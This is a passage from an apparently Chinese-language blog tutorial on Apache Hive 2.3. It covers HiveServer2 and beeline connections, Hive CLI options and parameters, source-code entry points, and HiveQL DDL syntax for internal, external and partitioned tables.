class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>然后在所有NameNode上执行命令<code>hdfs dfsadmin -fs hdfs://node01:8020 -refreshSuperUserGroupsConfiguration</code>刷新配置<ul><li>node01:8020为各NN监听的rpc端口，<code>hdfs dfsadmin -fs hdfs://node02:8020 -refreshSuperUserGroupsConfiguration</code></li></ul></li></ul></li><li>在node02上(root亦可)执行<code>hive --service metastore</code>启动元数据服务</li><li>在node03上用test(会连接hdfs)执行<code>hive --service hiveserver2</code>或<code>hiveserver2</code>两个命令其中一个都可以(阻塞式命令行)<ul><li>会监听两个端口10000(接受HiveServer2客户端连接)、10002</li></ul></li><li>在任意一台包含beeline脚本(hive-2.3.8/bin/beeline)的虚拟机中执行<code>beeline</code>的命令进行连接</li></ul></li><li><code>beeline</code>命令行<ul><li><code>!connect jdbc:hive2://node03:10000/default test 123</code> 连接HiveServer2服务器，test对应密码123可随便输入<ul><li>进入后显示<code>0: jdbc:hive2://node03:10000/default&gt;</code>命令行</li><li>在beeline命令行下执行非hive sql语句需要使用<code>!</code></li><li>或者bash下直接连接 <code>beeline -u jdbc:hive2://192.168.6.133:10000/default -n test</code> -u表示url，-n表示登录用户(不用密码)，其中default为hive数据库<ul><li>和系统用户无关，只是一个标识(如把hdfs的/tmp目录设置成777, 则随便输入即可访问)</li><li>hive虽然不会保存一个实际的用户，但是hive会保存用户名和权限的关系，因此此处输入的用户名会在权限判断时用到</li></ul></li></ul></li><li><code>!help</code> 查看命令帮助</li><li><code>!quit</code> 退出命令行</li><li><code>show tables;</code> 链接上数据库后即可和hive cli一样执行SQL语句</li></ul></li><li>jdbc的访问方式：创建普通的java项目，将hive的jar包添加到classpath中，最精简的jar包如下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">commons-lang-2.6.jar</span><br><span class="line">commons-logging-1.2.jar</span><br><span class="line">curator-client-2.7.1.jar</span><br><span class="line">curator-framework-2.7.1.jar</span><br><span class="line">guava-14.0.1.jar</span><br><span class="line">hive-exec-2.3.4.jar</span><br><span class="line">hive-jdbc-2.3.4.jar</span><br><span class="line">hive-jdbc-handler-2.3.4.jar</span><br><span class="line">hive-metastore-2.3.4.jar</span><br><span class="line">hive-service-2.3.4.jar</span><br><span class="line">hive-service-rpc-2.3.4.jar</span><br><span class="line">httpclient-4.4.jar</span><br><span class="line">httpcore-4.4.jar</span><br><span class="line">libfb303-0.9.3.jar</span><br><span class="line">libthrift-0.9.3.jar</span><br><span class="line">log4j-1.2-api-2.6.2.jar</span><br><span class="line">log4j-api-2.6.2.jar</span><br><span class="line">log4j-core-2.6.2.jar</span><br><span class="line">log4j-jul-2.5.jar</span><br><span class="line">log4j-slf4j-impl-2.6.2.jar</span><br><span class="line">log4j-web-2.6.2.jar</span><br><span class="line">zookeeper-3.4.6.jar</span><br></pre></td></tr></table></figure><h2 id="启停"><a href="#启停" class="headerlink" title="启停"></a>启停</h2><ul><li>启动hdfs和yarn集群，参考<a href="/_posts/bigdata/hadoop.md#启动/停止/使用">hadoop.md#启动/停止/使用</a></li><li>启动mysql (在node01上启动, 存放hive元数据)</li><li><code>hive --service metastore</code> 在node02上(root亦可)启动Thrift server，阻塞式窗口，卡住是正常现象</li><li><code>hive</code> 在node03上使用test用户执行，进入hive命令行即可执行增删改SQL<ul><li><code>quit;</code> 退出命令行</li></ul></li><li><code>hive --service hiveserver2</code> 在node03上用test启动Hiveserver2，参考<a href="#使用HiveServer2组件">使用HiveServer2组件</a></li><li><code>beeline</code> 连接到Hiveserver2，从而执行(查询)SQL，root亦可<ul><li><code>beeline -u jdbc:hive2://node03:10000/default -n test</code></li></ul></li></ul><h2 id="Hive命令使用"><a href="#Hive命令使用" class="headerlink" title="Hive命令使用"></a>Hive命令使用</h2><ul><li>hive运行方式分类<ul><li>命令行方式或者控制台模式</li><li>脚本运行方式（实际生产环境中用最多）</li><li>JDBC方式：hiveserver2</li><li>web GUI接口：hwi(hive v2.2以后已抛弃)、<a href="https://gethue.com/" target="_blank" rel="noopener">hue</a>等</li></ul></li></ul><h3 id="Hive-Cli"><a href="#Hive-Cli" class="headerlink" title="Hive Cli"></a>Hive Cli</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">hive --service cli <span class="comment"># 可简写为 `hive` 命令</span></span><br><span class="line">hive --service cli -h <span class="comment"># 查看 hive cli 命令帮助</span></span><br><span class="line"><span class="comment"># 帮助信息如下</span></span><br><span class="line">usage: hive</span><br><span class="line"> -d,--define &lt;key=value&gt;          Variable substitution to apply to Hive</span><br><span class="line">                                  commands. e.g. -d A=B or --define A=B</span><br><span class="line">    <span class="comment"># hive -d myid=1</span></span><br><span class="line">    <span class="comment"># select * from psn where id = $&#123;myid&#125;; # 使用上述定义的变量</span></span><br><span class="line">    --database &lt;databasename&gt;     Specify the database to use</span><br><span class="line"> -e &lt;quoted-query-string&gt;         SQL from <span class="built_in">command</span> line</span><br><span class="line">    <span class="comment"># hive -e "select * from psn; show tables;" &gt; result.log # 可执行多个SQL，打印结果到文件(不会包含hive启动日志)，执行完后退出命令行</span></span><br><span class="line"> -f &lt;filename&gt;                    SQL from files</span><br><span class="line">    <span class="comment"># hive -f ~/test.sql # 执行sql文件，完后会退出命令行</span></span><br><span class="line">    <span class="comment"># hive&gt; source test.sql; # 在hive命令行也可以执行本地sql文件，当前目录不能加~</span></span><br><span class="line"> -H,--<span class="built_in">help</span>                        Print <span class="built_in">help</span> information</span><br><span class="line">    --hiveconf &lt;property=value&gt;   Use value <span class="keyword">for</span> given property</span><br><span class="line">    --hivevar &lt;key=value&gt;         Variable substitution to apply to Hive</span><br><span class="line">                                  commands. e.g. --hivevar A=B</span><br><span class="line"> -i &lt;filename&gt;                    Initialization SQL file</span><br><span class="line">    <span class="comment"># hive -i ~/test.sql # 执行初始化sql文件，完后会停留在命令行</span></span><br><span class="line"> -S,--silent                      Silent mode <span class="keyword">in</span> interactive shell</span><br><span class="line">    <span class="comment"># hive -S # 静默模式，不会打印OK、Time taken等日志</span></span><br><span class="line"> -v,--verbose                     Verbose mode (<span class="built_in">echo</span> executed SQL to the console)</span><br></pre></td></tr></table></figure><ul><li>执行命令(hive命令行)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from psn; <span class="comment"># 执行Hive SQL</span></span><br><span class="line">dfs ls / <span class="comment"># 可以与HDFS交互</span></span><br><span class="line">! ls / <span class="comment"># 可以和linux交互</span></span><br><span class="line">quit; <span class="comment"># 退出hive命令行</span></span><br></pre></td></tr></table></figure><h3 id="参数操作"><a href="#参数操作" class="headerlink" title="参数操作"></a>参数操作</h3><ul><li>hive当中的参数、变量都是以命名空间开头的，详情如下表所示：</li></ul><table><thead><tr><th>命名空间</th><th>读写权限</th><th>含义</th></tr></thead><tbody><tr><td>hiveconf</td><td>可读写</td><td>hive-site.xml当中的各配置变量例：hive –hiveconf hive.cli.print.header=true</td></tr><tr><td>system</td><td>可读写</td><td>系统变量，包含JVM运行参数等例：system:user.name=root</td></tr><tr><td>env</td><td>只读</td><td>环境变量例：env：JAVA_HOME</td></tr><tr><td>hivevar</td><td>可读写</td><td>例：hive -d val=key。hive的变量可以通过<code>${}</code>方式进行引用，其中system、env下的变量必须以前缀开头</td></tr></tbody></table><ul><li>设置参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在启动hive cli时设置，此次会话生效。修改$&#123;HIVE_HOME&#125;/conf/hive-site.xml则永久生效</span></span><br><span class="line">hive --hiveconf hive.cli.print.header=<span class="literal">true</span> <span class="comment"># 打印表头</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在进入到cli之后，通过set命令设置</span></span><br><span class="line"><span class="built_in">set</span>; <span class="comment"># 查看所有参数, xxx=yyy、env:xxx=yyy、system:xxx=yyy</span></span><br><span class="line"><span class="built_in">set</span> hive.cli.print.header; <span class="comment"># 查看hive.cli.print.header的值</span></span><br><span class="line"><span class="built_in">set</span> hive.cli.print.header=<span class="literal">true</span>; <span class="comment"># 设值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hive参数初始化设置。当前用户每次进入hive cli的时候，都会加载.hiverc的文件，执行文件中的命令</span></span><br><span class="line">vi ~/.hiverc <span class="comment"># 在其中加入如`set hive.cli.print.header=true;`的参数配置</span></span><br><span class="line"><span class="comment"># cat ~/.hivehistory # 此文件中保存了hive cli中执行的所有命令</span></span><br></pre></td></tr></table></figure><h3 id="源码入口"><a href="#源码入口" class="headerlink" title="源码入口"></a>源码入口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.执行hive命令相当于执行了 hive --service cli</span></span><br><span class="line">hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.bin/etx/cli.sh: https://sourcegraph.com/github.com/apache/hive@rel/release-2.3.8/-/blob/bin/ext/cli.sh?L25</span></span><br><span class="line"><span class="function"><span class="title">updateCli</span></span>() &#123;</span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">"<span class="variable">$USE_DEPRECATED_CLI</span>"</span> == <span class="string">"true"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">export</span> HADOOP_CLIENT_OPTS=<span class="string">" -Dproc_hivecli <span class="variable">$HADOOP_CLIENT_OPTS</span> "</span></span><br><span class="line">    <span class="comment"># 主类</span></span><br><span class="line">    CLASS=org.apache.hadoop.hive.cli.CliDriver</span><br><span class="line">    JAR=hive-cli-*.jar</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">export</span> HADOOP_CLIENT_OPTS=<span class="string">" -Dproc_beeline <span class="variable">$HADOOP_CLIENT_OPTS</span> -Dlog4j.configurationFile=beeline-log4j2.properties"</span></span><br><span class="line">    CLASS=org.apache.hive.beeline.cli.HiveCli</span><br><span class="line">    JAR=hive-beeline-*.jar</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">cli</span></span> () &#123;</span><br><span class="line">  updateCli</span><br><span class="line">  execHiveCmd <span class="variable">$CLASS</span> <span class="variable">$JAR</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.https://sourcegraph.com/github.com/apache/hive@rel/release-2.3.8/-/blob/cli/src/java/org/apache/hadoop/hive/cli/CliDriver.java?L685</span></span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    int ret = new CliDriver().run(args);</span><br><span class="line">    System.exit(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SQL操作"><a href="#SQL操作" class="headerlink" title="SQL操作"></a>SQL操作</h2><ul><li><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual" target="_blank" rel="noopener">LanguageManual</a></li><li>DDL参考：<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+DDL" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/Hive/LanguageManual+DDL</a></li><li>DML参考：<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+DML" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/Hive/LanguageManual+DML</a></li><li>数据库说明<ul><li>默认情况下，所有的表存在于default数据库，在hdfs上的展示形式是将此数据库的表保存在hive的默认路径下</li><li>如果创建了数据库，那么会在hive的默认路径下生成一个database_name.db的文件夹，此数据库的所有表会保存在database_name.db的目录下</li></ul></li><li>内部表跟外部表的区别<ul><li>hive内部表创建的时候数据存储在hive的默认存储目录中，外部表在创建的时候需要制定额外的目录(不会在hive默认数据目录创建数据库文件夹)</li><li>hive内部表删除的时候，会将元数据和数据都删除，而外部表只会删除元数据，不会删除数据</li><li>应用场景<ul><li>内部表: 需要先创建表，然后向表中添加数据，适合做中间表的存储</li><li>外部表: 可以先创建表，再添加数据，也可以先有数据，再创建表，本质上是将hdfs的某一个目录的数据跟hive的表关联映射起来，因此适合原始数据的存储，不会因为误操作将数据给删除掉</li></ul></li></ul></li><li>分区表<ul><li>hive默认将表的数据保存在某一个hdfs的存储目录下，当需要检索符合条件的某一部分数据的时候，需要全量遍历数据，io量比较大，效率比较低。因此可以采用分而治之的思想，将符合某些条件的数据放置在某一个目录，此时检索的时候只需要搜索指定目录即可，不需要全量遍历数据</li><li>注意项<ul><li>当创建完分区表之后，在保存数据的时候，会在hdfs目录中看到分区列会成为一个目录，多个分区以多级目录的形式存在</li><li>当创建多分区表之后，插入数据的时候不可以只添加一个分区列，需要将所有的分区列都添加值</li><li>多分区表在添加分区列的值得时候，与顺序无关，与分区表的分区列的名称相关，按照名称就行匹配</li><li>修改表时，添加分区列的值的时候，如果定义的是多分区表，那么必须给所有的分区列都赋值</li><li>修改表时，删除分区列的值的时候，无论是单分区表还是多分区表，都可以将指定的分区进行删除</li></ul></li><li>修复分区<ul><li><code>msck repair table my_table;</code></li><li>在使用hive外部表的时候，可以先将数据上传到hdfs的某一个目录中，然后再创建外部表建立映射关系，如果在上传数据的时候，参考分区表的形式也创建了多级目录，那么此时创建完表之后，是查询不到数据的，原因是分区的元数据没有保存在mysql中，因此需要修复分区，将元数据同步更新到mysql中，此时才可以查询到元数据</li></ul></li></ul></li></ul><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><ul><li>启动说明</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动hdfs和yarn集群，略</span></span><br><span class="line"><span class="comment"># 在node01上启动mysql数据库，略</span></span><br><span class="line"><span class="comment"># 在node02上启动Thrift server，启动后jps查看有一个RunJar的进程（如果是cli连接hive则可不用启动）</span></span><br><span class="line">hive --service metastore</span><br><span class="line"><span class="comment"># 进入hive命令行(类似mysql命令行)，在node03上使用test用户执行(需要对hive.metastore.warehouse.dir有写入权限). 参考：https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Cli</span></span><br><span class="line">hive</span><br></pre></td></tr></table></figure><ul><li>简单操作</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 切换成test数据库</span></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建hive表. 会在hdfs中创建 /user/hive/warehouse/test.db/psn 目录(/user/hive/warehouse为hive默认数据根目录)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> psn</span><br><span class="line">(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span>,</span><br><span class="line">    likes <span class="built_in">array</span>&lt;<span class="keyword">string</span>&gt;,</span><br><span class="line">    address <span class="keyword">map</span>&lt;<span class="keyword">string</span>,<span class="keyword">string</span>&gt;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看所有表</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"><span class="comment">-- 查看某个表</span></span><br><span class="line">desc psn;</span><br><span class="line"><span class="keyword">describe</span> formatted psn; <span class="comment">-- 查看详细信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 插入数据. 加载本地(local)数据(/home/test/data/psn_data)到hive表</span></span><br><span class="line"><span class="comment">-- /home/test/data/psn_data 文件内容为 `1^Asmalle^Agames^Bmusica^Addr1^Cshanghai`，其中 ^A 使用 `Control + V + A` 进行输入。且启动hive的用户需要对此文件有访问权限</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/home/test/data/psn_data'</span> <span class="keyword">into</span> <span class="keyword">table</span> psn;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询数据. 结果为：1smalle["games","music"]&#123;"addr1":"shanghai"&#125;</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> psn;</span><br></pre></td></tr></table></figure><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 展示所有数据库，默认有一个 default 数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="comment">-- 切换成test数据库</span></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="comment">-- 删除数据库</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><h3 id="DDL-表操作"><a href="#DDL-表操作" class="headerlink" title="DDL(表操作)"></a>DDL(表操作)</h3><h4 id="创建表语法"><a href="#创建表语法" class="headerlink" title="创建表语法"></a>创建表语法</h4><ul><li>参考：<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+DDL#LanguageManualDDL-CreateTable" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/Hive/LanguageManual+DDL#LanguageManualDDL-CreateTable</a></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">TEMPORARY</span>] [<span class="keyword">EXTERNAL</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] [db_name.]table_name   <span class="comment">-- (<span class="doctag">Note:</span> TEMPORARY available in Hive 0.14.0 and later)</span></span><br><span class="line">[(col_name data_type [<span class="keyword">COMMENT</span> col_comment], ... [constraint_specification])]</span><br><span class="line">[<span class="keyword">COMMENT</span> table_comment]</span><br><span class="line"><span class="comment">-- 分区</span></span><br><span class="line">[PARTITIONED <span class="keyword">BY</span> (col_name data_type [<span class="keyword">COMMENT</span> col_comment], ...)]</span><br><span class="line"><span class="comment">-- 分桶</span></span><br><span class="line">[CLUSTERED <span class="keyword">BY</span> (col_name, col_name, ...) [SORTED <span class="keyword">BY</span> (col_name [<span class="keyword">ASC</span>|<span class="keyword">DESC</span>], ...)] <span class="keyword">INTO</span> num_buckets BUCKETS]</span><br><span class="line">[SKEWED <span class="keyword">BY</span> (col_name, col_name, ...)  <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.10.0 and later)]</span></span><br><span class="line"><span class="keyword">ON</span> ((col_value, col_value, ...), (col_value, col_value, ...), ...)</span><br><span class="line">[<span class="keyword">STORED</span> <span class="keyword">AS</span> DIRECTORIES]</span><br><span class="line">[</span><br><span class="line">    [<span class="keyword">ROW</span> <span class="keyword">FORMAT</span> row_format] </span><br><span class="line">    [<span class="keyword">STORED</span> <span class="keyword">AS</span> file_format]</span><br><span class="line">    | <span class="keyword">STORED</span> <span class="keyword">BY</span> <span class="string">'storage.handler.class.name'</span> [<span class="keyword">WITH</span> SERDEPROPERTIES (...)]  <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.6.0 and later)</span></span><br><span class="line">]</span><br><span class="line">[LOCATION hdfs_path]</span><br><span class="line">[TBLPROPERTIES (property_name=property_value, ...)]   <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.6.0 and later)</span></span><br><span class="line">[<span class="keyword">AS</span> select_statement];   <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.5.0 and later; not supported for external tables)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">TEMPORARY</span>] [<span class="keyword">EXTERNAL</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] [db_name.]table_name</span><br><span class="line">    <span class="keyword">LIKE</span> existing_table_or_view_name</span><br><span class="line">[LOCATION hdfs_path];</span><br><span class="line"><span class="comment">-- 复杂数据类型</span></span><br><span class="line">data_type</span><br><span class="line">    : primitive_type</span><br><span class="line">    | array_type</span><br><span class="line">    | map_type</span><br><span class="line">    | struct_type</span><br><span class="line">    | union_type  <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.7.0 and later)</span></span><br><span class="line"><span class="comment">-- 基本数据类型</span></span><br><span class="line">primitive_type</span><br><span class="line">    : TINYINT</span><br><span class="line">    | SMALLINT</span><br><span class="line">    | INT</span><br><span class="line">    | BIGINT</span><br><span class="line">    | BOOLEAN</span><br><span class="line">    | FLOAT</span><br><span class="line">    | DOUBLE</span><br><span class="line">    | DOUBLE PRECISION <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 2.2.0 and later)</span></span><br><span class="line">    | STRING</span><br><span class="line">    | BINARY      <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.8.0 and later)</span></span><br><span class="line">    | TIMESTAMP   <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.8.0 and later)</span></span><br><span class="line">    | DECIMAL     <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.11.0 and later)</span></span><br><span class="line">    | DECIMAL(precision, scale)  <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.13.0 and later)</span></span><br><span class="line">    | DATE        <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.12.0 and later)</span></span><br><span class="line">    | VARCHAR     <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.12.0 and later)</span></span><br><span class="line">    | CHAR        <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.13.0 and later)</span></span><br><span class="line"></span><br><span class="line">array_type</span><br><span class="line">    : ARRAY &lt; data_type &gt;</span><br><span class="line"></span><br><span class="line">map_type</span><br><span class="line">    : MAP &lt; primitive_type, data_type &gt;</span><br><span class="line"></span><br><span class="line">struct_type</span><br><span class="line">    : STRUCT &lt; col_name : data_type [COMMENT col_comment], ...&gt;</span><br><span class="line"></span><br><span class="line">union_type</span><br><span class="line">    : UNIONTYPE &lt; data_type, data_type, ... &gt;  -- (Note: Available in Hive 0.7.0 and later)</span><br><span class="line"><span class="comment">-- 行格式规范</span></span><br><span class="line">row_format</span><br><span class="line">    : DELIMITED [FIELDS TERMINATED BY char [ESCAPED BY char]] [COLLECTION ITEMS TERMINATED BY char]</span><br><span class="line">    [MAP KEYS TERMINATED BY char] [LINES TERMINATED BY char]</span><br><span class="line">    [NULL DEFINED AS char]   <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.13 and later)</span></span><br><span class="line">    | SERDE serde_name [WITH SERDEPROPERTIES (property_name=property_value, property_name=property_value, ...)]</span><br><span class="line"><span class="comment">-- 文件基本类型</span></span><br><span class="line">file_format:</span><br><span class="line">    : SEQUENCEFILE</span><br><span class="line">    | TEXTFILE    <span class="comment">-- (Default, depending on hive.default.fileformat configuration)</span></span><br><span class="line">    | RCFILE      <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.6.0 and later)</span></span><br><span class="line">    | ORC         <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.11.0 and later)</span></span><br><span class="line">    | PARQUET     <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.13.0 and later)</span></span><br><span class="line">    | AVRO        <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 0.14.0 and later)</span></span><br><span class="line">    | JSONFILE    <span class="comment">-- (<span class="doctag">Note:</span> Available in Hive 4.0.0 and later)</span></span><br><span class="line">    | INPUTFORMAT input_format_classname OUTPUTFORMAT output_format_classname</span><br><span class="line"><span class="comment">-- 表约束</span></span><br><span class="line">constraint_specification:</span><br><span class="line">    : [, PRIMARY KEY (col_name, ...) DISABLE NOVALIDATE ]</span><br><span class="line">    [, CONSTRAINT constraint_name FOREIGN KEY (col_name, ...) REFERENCES table_name(col_name, ...) DISABLE NOVALIDATE</span><br></pre></td></tr></table></figure><h4 id="创建表案例"><a href="#创建表案例" class="headerlink" title="创建表案例"></a>创建表案例</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 外部表(需要添加external和location的关键字). 不会在hive默认数据目录创建文件夹</span></span><br><span class="line"><span class="comment">-- 分区表(partitioned)</span></span><br><span class="line"><span class="comment">-- 自定义分隔符</span></span><br><span class="line"><span 